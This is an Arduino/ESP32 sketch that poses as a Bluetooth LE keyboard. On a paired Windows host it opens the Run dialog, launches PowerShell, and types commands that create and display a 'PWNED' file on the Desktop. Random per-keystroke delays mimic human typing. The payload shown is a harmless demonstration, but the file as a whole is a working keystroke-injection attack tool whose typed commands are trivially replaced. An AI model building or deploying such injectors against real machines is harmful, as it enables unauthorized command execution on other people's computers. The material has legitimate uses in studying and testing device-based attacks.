#include <BleKeyboard.h>

BleKeyboard bleKeyboard;

void setup() {
  Serial.begin(115200);
  Serial.println("Starting BLE keyboard.");
  bleKeyboard.begin();
}

void loop() {
  if(bleKeyboard.isConnected()) {
    // Run MOD_GUI_LEFT + KEY_R
    bleKeyboard.press(KEY_LEFT_GUI);
    bleKeyboard.press(0x72);

    delay(500);

    bleKeyboard.release(KEY_LEFT_GUI);
    bleKeyboard.release(0x72);

    Serial.println("[+] Run powershell");
    writeAndReturn("powershell.exe");

    delay(1000);

    Serial.println("[+] Go to desktop");
    writeAndReturn("cd Desktop");

    Serial.println("[+] Create file with PWNED text");
    writeAndReturn("echo \"PWNED\" > pwned.txt");

    Serial.println("[+] Display content of pwned.txt");
    writeAndReturn("type pwned.txt");

    Serial.println("[+] Wait 5 seconds before closing powershell");
    delay(5000);

    Serial.println("[+] Exit powershell");
    writeAndReturn("exit");

    Serial.println("[+] Finished");
    delay(600000); // Wait 10 minutes to disconnect
  }

  Serial.println("Waiting 15 seconds...");
  delay(15000);
}

void writeAndReturn(String text) {
  int textLength = text.length(); 
  for (int i = 0; i < textLength; i++) {
    delay(random(25,50));
    bleKeyboard.print(text[i]);
  }
  bleKeyboard.write(KEY_RETURN);
}
